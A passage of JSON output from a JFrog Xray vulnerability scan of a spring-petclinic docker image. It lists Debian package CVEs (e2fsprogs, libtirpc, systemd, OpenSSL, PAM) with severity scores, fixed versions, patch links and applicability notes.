                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203593",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds write in e2fsck can lead to local privilege escalation when processing a crafted filesystem image.",
            "FullDescription": "[e2fsprogs](http://e2fsprogs.sourceforge.net/) is a set of utilities for maintaining the ext2, ext3 and ext4 file systems. Since those file systems are often the default for Linux distributions, it is commonly considered to be essential software.\n\nA crafted malicious filesystem can cause a segmentation fault and arbitrary code execution in e2fsprogs. \n\nHowever, the attacker should either find an input that propagates and turns out to be passed to the `e2fsck` tool or use another vulnerability to upload the malicious filesystem image and find a way to pass it to `e2fsck`.\n\nIt’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "The attack must be performed locally, as it’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The Denial-of-Service impact is mitigated since the only known attack vector is by running a forked process (`e2fsck`). Crashing a forked client process is usually not a severe impact. Also, the e2fsprogs tools are userland utilities, thus not affecting the kernel and cannot lead to a container escape.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A Proof-of-Concept which leads to a Denial-of-Service was published by the reporting researcher.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to run the `e2fsck` tool on a crafted filesystem.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to put a crafted filesystem image on the target filesystem and have a privileged user execute the `e2fsck` tool on this image.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/commit/?h=maint&id=ab51d587bb9b229b1fade1afd02e1574c1ba5c76",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "cve_id": "CVE-2022-1304",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"e2fsck\" CLI tool with an attacker-supplied image/device.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "vulnerability_id": "CVE-2022-1304",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-203593",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:e2fsprogs",
         "source_id": "deb://debian:bullseye:e2fsprogs",
         "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
         "component_versions": {
            "id": "debian:bullseye:e2fsprogs",
            "vulnerable_versions": [
               "< 1.46.2-2+deb11u1"
            ],
            "fixed_versions": [
               "1.46.2-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1304",
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An out-of-bounds read/write vulnerability was found in e2fsprogs 1.46.5. This issue leads to a segmentation fault and possibly arbitrary code execution via a specially crafted filesystem.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203593",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds write in e2fsck can lead to local privilege escalation when processing a crafted filesystem image.",
            "FullDescription": "[e2fsprogs](http://e2fsprogs.sourceforge.net/) is a set of utilities for maintaining the ext2, ext3 and ext4 file systems. Since those file systems are often the default for Linux distributions, it is commonly considered to be essential software.\n\nA crafted malicious filesystem can cause a segmentation fault and arbitrary code execution in e2fsprogs. \n\nHowever, the attacker should either find an input that propagates and turns out to be passed to the `e2fsck` tool or use another vulnerability to upload the malicious filesystem image and find a way to pass it to `e2fsck`.\n\nIt’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "The attack must be performed locally, as it’s highly unlikely a remote service would use the `e2fsck` tool on externally supplied input.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The Denial-of-Service impact is mitigated since the only known attack vector is by running a forked process (`e2fsck`). Crashing a forked client process is usually not a severe impact. Also, the e2fsprogs tools are userland utilities, thus not affecting the kernel and cannot lead to a container escape.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A Proof-of-Concept which leads to a Denial-of-Service was published by the reporting researcher.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "Requires the user to run the `e2fsck` tool on a crafted filesystem.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to put a crafted filesystem image on the target filesystem and have a privileged user execute the `e2fsck` tool on this image.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/commit/?h=maint&id=ab51d587bb9b229b1fade1afd02e1574c1ba5c76",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "cve_id": "CVE-2022-1304",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"e2fsck\" CLI tool with an attacker-supplied image/device.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libss2:1.46.2-2",
            "vulnerability_id": "CVE-2022-1304",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-231587",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In libtirpc before 1.3.3rc1, remote attackers could exhaust the file descriptors of a process that uses libtirpc because idle TCP connections are mishandled. This can, in turn, lead to an svc_run infinite loop without accepting new connections.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libtirpc3",
         "source_id": "deb://debian:bullseye:libtirpc3",
         "source_comp_id": "deb://debian:bullseye:libtirpc3:1.3.1-1",
         "component_versions": {
            "id": "debian:bullseye:libtirpc",
            "vulnerable_versions": [
               "< 1.3.1-1+deb11u1"
            ],
            "fixed_versions": [
               "1.3.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-46828",
                     "cwe": [
                        "CWE-755",
                        "CWE-835"
                     ],
                     "cwe_details": {
                        "CWE-755": {
                           "name": "Improper Handling of Exceptional Conditions",
                           "description": "The product does not handle or incorrectly handles an exceptional condition."
                        },
                        "CWE-835": {
                           "name": "Loop with Unreachable Exit Condition ('Infinite Loop')",
                           "description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In libtirpc before 1.3.3rc1, remote attackers could exhaust the file descriptors of a process that uses libtirpc because idle TCP connections are mishandled. This can, in turn, lead to an svc_run infinite loop without accepting new connections.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-46828",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-231587",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In libtirpc before 1.3.3rc1, remote attackers could exhaust the file descriptors of a process that uses libtirpc because idle TCP connections are mishandled. This can, in turn, lead to an svc_run infinite loop without accepting new connections.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libtirpc-common",
         "source_id": "deb://debian:bullseye:libtirpc-common",
         "source_comp_id": "deb://debian:bullseye:libtirpc-common:1.3.1-1",
         "component_versions": {
            "id": "debian:bullseye:libtirpc",
            "vulnerable_versions": [
               "< 1.3.1-1+deb11u1"
            ],
            "fixed_versions": [
               "1.3.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-46828",
                     "cwe": [
                        "CWE-755",
                        "CWE-835"
                     ],
                     "cwe_details": {
                        "CWE-755": {
                           "name": "Improper Handling of Exceptional Conditions",
                           "description": "The product does not handle or incorrectly handles an exceptional condition."
                        },
                        "CWE-835": {
                           "name": "Loop with Unreachable Exit Condition ('Infinite Loop')",
                           "description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In libtirpc before 1.3.3rc1, remote attackers could exhaust the file descriptors of a process that uses libtirpc because idle TCP connections are mishandled. This can, in turn, lead to an svc_run infinite loop without accepting new connections.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-46828",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-260977",
         "severity": "Medium",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An off-by-one Error issue was discovered in Systemd in format_timespan() function of time-util.c. An attacker could supply specific values for time and accuracy that leads to buffer overrun in format_timespan(), leading to a Denial of Service.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u2"
            ],
            "fixed_versions": [
               "247.3-7+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3821",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An off-by-one Error issue was discovered in Systemd in format_timespan() function of time-util.c. An attacker could supply specific values for time and accuracy that leads to buffer overrun in format_timespan(), leading to a Denial of Service.",
               "provider": "JFrog"
            }
         },
         "edited": "2022-12-31T17:43:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-260977",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds write in systemd leads to denial of service when formatting timespans.",
            "FullDescription": "[systemd](https://systemd.io/) is a software suite that provides an array of system components for Linux-based operating systems. Its main aim is to unify service configuration and behavior across Linux distributions.\n\nIt was discovered that due to an off-by-one error in the `format_timespan` function in `time-util.c`, a 1-byte buffer overflow occurs, which may lead to a denial of service.\n\nThe issue requires control over both arguments of the vulnerable function: `t` and `accuracy`.\n\nThe vulnerable function is inside an internal header file, which isn't exported and is only used by the `systemd` utilities.\nNo user input is supplied to this function through the default `systemd` utilities.\nAlso, developing code and linking with the library `-lsystemd` doesn't give access to this function.\nTherefore - on almost all systems there is no way to trigger this issue.",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "An internal test that overwrites one byte was published on the GitHub Issue.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "On almost all systems there is no way to trigger this issue, since the vulnerable internal function cannot be called with external input -\n1. The vulnerable internal function is not exported\n2. All the `systemd` utilities that use this function, do not pass user data to the vulnerable arguments",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The issue causes a 1-byte overflow, which is unlikely to cause a crash or any other impact in real-world environments.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Patch",
                  "Url": "https://github.com/systemd/systemd/commit/9102c625a673a3246d7e73d8737f3494446bad4e",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official GitHub Issue",
                  "Url": "https://github.com/systemd/systemd/issues/23928",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-3821",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-260977",
         "severity": "Medium",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An off-by-one Error issue was discovered in Systemd in format_timespan() function of time-util.c. An attacker could supply specific values for time and accuracy that leads to buffer overrun in format_timespan(), leading to a Denial of Service.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u2"
            ],
            "fixed_versions": [
               "247.3-7+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3821",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An off-by-one Error issue was discovered in Systemd in format_timespan() function of time-util.c. An attacker could supply specific values for time and accuracy that leads to buffer overrun in format_timespan(), leading to a Denial of Service.",
               "provider": "JFrog"
            }
         },
         "edited": "2022-12-31T17:43:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-260977",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds write in systemd leads to denial of service when formatting timespans.",
            "FullDescription": "[systemd](https://systemd.io/) is a software suite that provides an array of system components for Linux-based operating systems. Its main aim is to unify service configuration and behavior across Linux distributions.\n\nIt was discovered that due to an off-by-one error in the `format_timespan` function in `time-util.c`, a 1-byte buffer overflow occurs, which may lead to a denial of service.\n\nThe issue requires control over both arguments of the vulnerable function: `t` and `accuracy`.\n\nThe vulnerable function is inside an internal header file, which isn't exported and is only used by the `systemd` utilities.\nNo user input is supplied to this function through the default `systemd` utilities.\nAlso, developing code and linking with the library `-lsystemd` doesn't give access to this function.\nTherefore - on almost all systems there is no way to trigger this issue.",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "An internal test that overwrites one byte was published on the GitHub Issue.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "On almost all systems there is no way to trigger this issue, since the vulnerable internal function cannot be called with external input -\n1. The vulnerable internal function is not exported\n2. All the `systemd` utilities that use this function, do not pass user data to the vulnerable arguments",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The issue causes a 1-byte overflow, which is unlikely to cause a crash or any other impact in real-world environments.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Patch",
                  "Url": "https://github.com/systemd/systemd/commit/9102c625a673a3246d7e73d8737f3494446bad4e",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official GitHub Issue",
                  "Url": "https://github.com/systemd/systemd/issues/23928",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-3821",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-589396",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-0727",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL to crash leading to a potential Denial of Service attack  Impact summary: Applications loading files in the PKCS12 format from untrusted sources might terminate abruptly.  A file in PKCS12 format can contain certificates and keys and may come from an untrusted source. The PKCS12 specification allows certain fields to be NULL, but OpenSSL does not correctly check for this case. This can lead to a NULL pointer dereference that results in OpenSSL crashing. If an application processes PKCS12 files from an untrusted source using the OpenSSL APIs then that application will be vulnerable to this issue.  OpenSSL APIs that are vulnerable to this are: PKCS12_parse(), PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes() and PKCS12_newpass().  We have also fixed a similar issue in SMIME_write_PKCS7(). However since this function is related to writing data we do not consider it security significant.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-0727",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-589396",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-0727",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL to crash leading to a potential Denial of Service attack  Impact summary: Applications loading files in the PKCS12 format from untrusted sources might terminate abruptly.  A file in PKCS12 format can contain certificates and keys and may come from an untrusted source. The PKCS12 specification allows certain fields to be NULL, but OpenSSL does not correctly check for this case. This can lead to a NULL pointer dereference that results in OpenSSL crashing. If an application processes PKCS12 files from an untrusted source using the OpenSSL APIs then that application will be vulnerable to this issue.  OpenSSL APIs that are vulnerable to this are: PKCS12_parse(), PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes() and PKCS12_newpass().  We have also fixed a similar issue in SMIME_write_PKCS7(). However since this function is related to writing data we do not consider it security significant.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-0727",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-588807",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam0g",
         "source_id": "deb://debian:bullseye:libpam0g",
         "source_comp_id": "deb://debian:bullseye:libpam0g:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-22365",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-22365",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-588807",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam-modules",
         "source_id": "deb://debian:bullseye:libpam-modules",
         "source_comp_id": "deb://debian:bullseye:libpam-modules:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-22365",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-22365",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-588807",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
